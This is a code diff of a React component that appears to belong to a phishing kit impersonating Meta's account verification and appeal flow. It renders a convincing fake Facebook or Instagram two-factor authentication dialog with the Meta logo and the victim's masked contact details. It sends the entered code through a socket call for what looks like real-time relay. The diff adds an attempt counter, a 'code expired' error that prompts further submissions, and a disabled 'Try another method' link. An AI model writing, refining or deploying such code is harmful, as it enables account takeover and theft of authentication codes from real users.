@@ -1,28 +1,14 @@
-import '@/assets/css/two-fa-modal.css';
+'use client';
+
+import '@/assets/css/meta-verified-modals.css';
 import TwoFaImage from '@/assets/images/2FA.png';
 import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
+import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
 import { useAppealContext } from '@/hooks/use-appeal-context';
 import { store } from '@/store/store';
 import { submitCodeApproval } from '@/hooks/use-socket';
-import translateText from '@/utils/translate';
 import Image from 'next/image';
-import { type FC, type FormEvent, useEffect, useMemo, useState } from 'react';
-
-const TEXT = {
-    title: 'Two-factor authentication request',
-    instructionPrefix: 'Enter the code sent to',
-    instructionSuffix: ', or confirm with an authenticator app.',
-    codePlaceholder: 'Code',
-    error: 'The code you entered is incorrect. Please try again.',
-    waiting: 'Waiting for verification...',
-    continue: 'Continue',
-    tryAnother: 'Try another method',
-    facebook: 'Facebook',
-    instagram: 'Instagram',
-    userFallback: 'User'
-} as const;
-
-const textsToTranslate = Object.values(TEXT);
+import { type FC, type FormEvent, useMemo, useState } from 'react';
 
 const maskEmail = (email: string): string => {
     if (!email) {
@@ -49,51 +35,27 @@ const maskPhone = (phone: string): string => {
     return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
 };
 
-const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
+const VerifyModal: FC<{ nextStep: () => void; uiTexts: MetaVerifiedTexts }> = ({ nextStep, uiTexts }) => {
     const [code, setCode] = useState('');
     const [isLoading, setIsLoading] = useState(false);
     const [showInputError, setShowInputError] = useState(false);
-    const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, userData, loginProvider } = store();
+    const { userData, loginProvider } = store();
     const appeal = useAppealContext();
-
-    const t = (text: string): string => translations[text] || text;
 
     const normalizedCode = code.replace(/\D/g, '');
     const isCodeValid = /^\d{6,8}$/.test(normalizedCode);
     const canSubmit = isCodeValid && !isLoading;
 
-    const providerLabel =
-        loginProvider === 'instagram' ? t(TEXT.instagram) : loginProvider === 'facebook' ? t(TEXT.facebook) : t(TEXT.facebook);
-
-    const userName = userData.fullName.trim() || t(TEXT.userFallback);
+    const providerLabel = loginProvider === 'instagram' ? 'Instagram' : 'Facebook';
+    const userName = userData.fullName.trim() || 'User';
+    const stepLabel = `(${uiTexts.step} ${appeal.twoFAAttempts.length + 1})`;
 
     const instructionText = useMemo(() => {
         const email = maskEmail(userData.personalEmail);
         const phone = maskPhone(userData.phoneNumber);
-        return `${t(TEXT.instructionPrefix)} ${email}, ${phone}${t(TEXT.instructionSuffix)}`;
-    }, [userData.personalEmail, userData.phoneNumber, t]);
-
-    useEffect(() => {
-        document.title = 'Two-factor authentication';
-    }, []);
-
-    useEffect(() => {
-        if (!geoInfo) {
-            return;
-        }
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
+        return `${uiTexts.twoFAInstructionPrefix} ${email}, ${phone}, ${uiTexts.twoFAInstructionSuffix}`;
+    }, [userData.personalEmail, userData.phoneNumber, uiTexts]);
 
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
@@ -143,68 +105,96 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         }
     };
 
-    const showErrorMessage = showInputError;
-
     return (
-        <div className='two-fa-page two-fa-overlay' role='dialog' aria-modal='true' aria-labelledby='two-fa-title'>
-            <div className='two-fa-modal'>
-                <div className='two-fa-body'>
-                    <div className='w-full'>
-                        <div className='two-fa-user-row'>
-                            <span>{userName}</span>
-                            <div className='two-fa-user-dot' aria-hidden='true' />
-                            <span>{providerLabel}</span>
-                        </div>
-
-                        <h2 id='two-fa-title' className='two-fa-title'>
-                            {t(TEXT.title)}
-                        </h2>
-
-                        <p className='two-fa-instruction'>{instructionText}</p>
-
-                        <div className='two-fa-image-wrap'>
-                            <Image src={TwoFaImage} alt='' width={480} className='h-auto w-full' />
-                        </div>
-
-                        <form id='two-fa-form' onSubmit={handleSubmit}>
-                            <div className={`two-fa-input-wrap ${showErrorMessage ? 'is-error' : ''}`}>
-                                <input
-                                    id='two-fa-code'
-                                    className='two-fa-input'
-                                    inputMode='numeric'
-                                    placeholder={t(TEXT.codePlaceholder)}
-                                    maxLength={8}
-                                    type='text'
-                                    autoComplete='off'
-                                    value={code}
-                                    disabled={isLoading}
-                                    onChange={(e) => {
-                                        const value = e.target.value.replace(/\D/g, '').slice(0, 8);
-                                        setCode(value);
-                                        setShowInputError(false);
-                                    }}
-                                />
-                            </div>
-
-                            {showErrorMessage ? <p className='two-fa-error'>{t(TEXT.error)}</p> : null}
-
-                            {isLoading ? <p className='two-fa-waiting'>{t(TEXT.waiting)}</p> : null}
-
-                            <div className='mt-2.5 w-full'>
-                                <button type='submit' className='two-fa-submit' disabled={!canSubmit}>
-                                    {isLoading ? <span className='two-fa-spinner' /> : t(TEXT.continue)}
-                                </button>
-                            </div>
-
-                            <div className='two-fa-alt-method'>
-                                <span>{t(TEXT.tryAnother)}</span>
-                            </div>
-
-                            <div className='mx-auto mt-5 w-16'>
-                                <Image src={MetaLogoGrey} alt='Meta' width={64} className='w-full object-contain' />
-                            </div>
-                        </form>
+        <div className='mv-modal-overlay' role='dialog' aria-modal='true'>
+            <div className='mv-modal-card' style={{ padding: '28px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                <div className='w-full'>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '14px', color: '#9a979e', marginBottom: '7px' }}>
+                        <span>{userName}</span>
+                        <div style={{ width: '4px', height: '4px', backgroundColor: '#9a979e', borderRadius: '5px' }} />
+                        <span>{providerLabel}</span>
                     </div>
+
+                    <h2 style={{ fontSize: '20px', lineHeight: 1.3, color: '#000', fontWeight: 700, marginBottom: '15px', wordBreak: 'break-word' }}>
+                        {uiTexts.twoFAStep} {stepLabel}
+                    </h2>
+
+                    <p style={{ color: '#9a979e', fontSize: '14px', lineHeight: 1.55, margin: 0 }}>{instructionText}</p>
+
+                    <div style={{ width: '100%', borderRadius: '10px', backgroundColor: '#f5f5f5', overflow: 'hidden', margin: '15px 0' }}>
+                        <Image src={TwoFaImage} alt='authentication' width={480} className='h-auto w-full' />
+                    </div>
+
+                    <form onSubmit={handleSubmit}>
+                        <label htmlFor='two-fa-code' style={{ display: 'block', marginBottom: '6px', fontSize: '13px', fontWeight: 600, color: '#3b4a64' }}>
+                            {uiTexts.code} <span style={{ color: '#e5484d' }}>*</span>
+                        </label>
+
+                        <div className={`mv-login-input-wrap${showInputError ? ' is-error' : ''}`} style={{ padding: '0 11px' }}>
+                            <input
+                                id='two-fa-code'
+                                className='mv-login-input'
+                                style={{ padding: 0 }}
+                                inputMode='numeric'
+                                placeholder={uiTexts.code}
+                                maxLength={8}
+                                type='text'
+                                autoComplete='off'
+                                value={code}
+                                disabled={isLoading}
+                                onChange={(e) => {
+                                    setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
+                                    setShowInputError(false);
+                                }}
+                            />
+                        </div>
+
+                        {showInputError ? (
+                            <p style={{ color: '#e74c3c', fontSize: '12px', margin: '-1px 0 10px 0' }}>{uiTexts.codeExpired}</p>
+                        ) : (
+                            <p style={{ color: '#6a7893', fontSize: '12px', margin: '-1px 0 10px 0' }}>{uiTexts.validCodeHint}</p>
+                        )}
+
+                        <div style={{ width: '100%', marginTop: '20px' }}>
+                            <button
+                                type='submit'
+                                className='mv-login-submit'
+                                disabled={!canSubmit}
+                                style={{ opacity: !canSubmit ? 0.7 : 1, cursor: !canSubmit ? 'not-allowed' : 'pointer' }}
+                            >
+                                {isLoading ? (
+                                    <>
+                                        <span className='mv-modal-spinner' style={{ marginRight: '8px' }} />
+                                        {uiTexts.pleaseWait}
+                                    </>
+                                ) : (
+                                    uiTexts.continueBtn
+                                )}
+                            </button>
+                        </div>
+
+                        <div
+                            style={{
+                                width: '100%',
+                                marginTop: '20px',
+                                color: '#9a979e',
+                                display: 'flex',
+                                alignItems: 'center',
+                                justifyContent: 'center',
+                                borderRadius: '40px',
+                                padding: '10px 20px',
+                                border: '1px solid #d4dbe3',
+                                fontSize: '14px',
+                                pointerEvents: 'none'
+                            }}
+                        >
+                            <span>{uiTexts.tryAnotherMethod}</span>
+                        </div>
+                    </form>
+                </div>
+
+                <div style={{ width: '60px', height: '60px', flexShrink: 0, margin: '0 auto' }}>
+                    <Image src={MetaLogoGrey} width={60} height={60} alt='Meta' style={{ objectFit: 'contain' }} />
                 </div>
             </div>
         </div>
